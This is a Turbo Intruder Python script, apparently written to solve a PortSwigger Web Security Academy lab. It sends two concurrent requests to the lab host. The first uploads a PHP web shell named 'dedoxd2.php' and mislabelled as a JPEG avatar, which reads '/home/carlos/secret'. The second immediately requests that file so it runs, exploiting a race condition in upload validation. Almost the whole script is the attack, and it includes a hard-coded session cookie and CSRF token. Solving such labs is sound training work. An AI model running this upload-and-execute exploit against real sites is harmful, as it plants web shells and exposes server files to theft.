# This is just for making sure the engine works during development
# Launch with java -jar build/libs/turbo-intruder-all.jar resources/examples/test.py /dev/null z z
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://0ae4003304ec71c3803e8a4500c30025.web-security-academy.net:443',
                           concurrentConnections=2,
                           requestsPerConnection=10,
                           pipeline=False
                           )

    noPayload = '''POST /my-account/avatar HTTP/2
Host: 0ae4003304ec71c3803e8a4500c30025.web-security-academy.net
Cookie: session=KugX2NAawaeSqc5JugGTRQIWUMAyKS2t
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------87015223526465993713268590412
Content-Length: 51320
Origin: https://0ae4003304ec71c3803e8a4500c30025.web-security-academy.net
Referer: https://0ae4003304ec71c3803e8a4500c30025.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------87015223526465993713268590412
Content-Disposition: form-data; name="avatar"; filename="dedoxd2.php"
Content-Type: image/jpeg

<?php echo file_get_contents("/home/carlos/secret"); ?>
-----------------------------87015223526465993713268590412
Content-Disposition: form-data; name="user"

wiener
-----------------------------87015223526465993713268590412
Content-Disposition: form-data; name="csrf"

jxJVt9fLw78wZ7zCGurEZHK6movNaYFf
-----------------------------87015223526465993713268590412--


'''
    engine.queue(noPayload)

    onePayload = '''GET /files/avatars/dedoxd2.php HTTP/2
Host: 0ae4003304ec71c3803e8a4500c30025.web-security-academy.net
Cookie: session=KugX2NAawaeSqc5JugGTRQIWUMAyKS2t
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers

'''
    engine.queue(onePayload)





def handleResponse(req, interesting):
    table.add(req)


def completed(requests):
    for req in requests:
        print(req.code)